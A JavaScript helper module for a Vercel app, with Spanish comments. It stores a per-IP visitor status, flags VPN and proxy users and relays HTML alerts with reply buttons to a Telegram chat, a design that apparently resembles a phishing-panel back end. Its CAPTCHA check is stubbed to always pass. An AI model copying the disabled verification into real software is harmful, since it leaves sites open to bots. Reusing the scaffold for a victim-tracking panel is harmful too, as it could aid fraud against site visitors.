import { kv } from '@vercel/kv';

export async function verifyTurnstile(token) {
    // Validación deshabilitada para no requerir credenciales extra
    return true;
}

export function getClientIp(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        return forwarded.split(',')[0].trim();
    }
    return req.socket?.remoteAddress || '127.0.0.1';
}

export async function setUserState(ip, status) {
    try {
        await kv.set(`status_${ip}`, status, { ex: 3600 }); // Expira en 1 hora
    } catch (e) {
        console.error("Error setting KV state:", e);
    }
}

export async function getUserState(ip) {
    try {
        const status = await kv.get(`status_${ip}`);
        return status || 'WAITING';
    } catch (e) {
        console.error("Error getting KV state:", e);
        return 'WAITING';
    }
}

export async function checkVpnProxy(ip) {
    if (["127.0.0.1", "localhost", "::1"].includes(ip)) return "";
    try {
        const res = await fetch(`https://ipwho.is/${ip}`);
        const data = await res.json();
        if (data.security && (data.security.vpn || data.security.proxy)) {
            return " 🚨 <b>[ALERTA: POSIBLE VPN/PROXY]</b>";
        }
    } catch (e) {
        console.warn("VPN check failed:", e);
    }
    return "";
}

export async function sendTelegramMessage(message, replyMarkup = null) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    if (!token || !chatId) {
        console.warn("Telegram Token o Chat ID no configurados.");
        return;
    }
    
    const payload = {
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
    };
    if (replyMarkup) payload.reply_markup = replyMarkup;

    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error("Telegram send error:", e);
    }
}
